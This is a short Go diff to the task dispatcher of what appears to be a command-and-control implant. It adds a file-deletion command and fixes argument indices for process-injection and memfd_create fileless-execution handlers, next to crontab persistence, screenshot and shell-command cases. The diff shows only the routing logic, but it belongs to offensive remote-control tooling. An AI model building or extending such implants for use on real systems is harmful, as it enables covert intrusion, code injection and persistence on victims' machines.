@@ -146,6 +146,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = basic.CreateDirectory(t.Args[0])
 	case "rmdir":
 		result, cmdError = basic.DeleteDirectory(t.Args[0])
+	case "rm":
+		result, cmdError = basic.DeleteFile(t.Args[0])
 	case "killproc":
 		result, cmdError = basic.KillProcess(t.Args[0])
 	case "ifconfig":
@@ -159,11 +161,11 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "raw-self-inject":
 		result, cmdError = processinjection.RawSelfInject(t.File)
 	case "remote-inject":
-		result, cmdError = processinjection.RemoteInject(t.File, t.Args[1])
+		result, cmdError = processinjection.RemoteInject(t.File, t.Args[0])
 	case "spawn-inject":
-		result, cmdError = processinjection.SpawnInject(t.File, t.Args[1])
+		result, cmdError = processinjection.SpawnInject(t.File, t.Args[0])
 	case "spawn-inject-pipe":
-		result, cmdError = processinjection.SpawnInjectReadPipe(t.File, t.Args[1])
+		result, cmdError = processinjection.SpawnInjectReadPipe(t.File, t.Args[0])
 	case "screenshot":
 		result, cmdError = screenshot.Screenshot()
 		screenshotTask = true
@@ -285,7 +287,7 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "crontab":
 		result, cmdError = crontab.AppendCronJob(t.Args[0])
 	case "memfd_create":
-		result, cmdError = memfdcreate.MemfdCreate(t.File, t.Args[1])
+		result, cmdError = memfdcreate.MemfdCreate(t.File, t.Args[0])
 	case "shell":
 		result, cmdError = basic.ShellCommand(t.Args)
 	default:
